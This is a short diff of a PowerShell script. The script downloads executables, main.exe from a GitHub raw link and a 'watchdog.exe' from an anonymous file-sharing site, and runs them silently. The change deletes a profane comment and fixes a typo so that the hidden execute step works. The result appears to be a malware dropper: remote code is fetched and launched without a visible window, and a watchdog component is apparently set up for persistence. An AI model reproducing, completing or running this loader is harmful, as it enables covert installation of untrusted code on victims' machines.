@@ -13,14 +13,13 @@ $url = "https://github.com/manyak-cmd/a/raw/refs/heads/main/main.exe"
 if (!(Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force
 }
-# fuck you
 
 # Kiểm tra nếu file chưa tồn tại thì tải về
 if (!(Test-Path $filePath)) {
     Invoke-WebRequest -Uri $url -OutFile $filePath
 }
 
-Start-Proces -FilePath $filePath -NoNewWindow
+Start-Process -FilePath $filePath -NoNewWindow
 
 $filePath = "$folderPath\watchdog.exe"
 $url = "https://anonsharing.com/file/0da952d4aeb48c3b/H-Output_(2).exe"
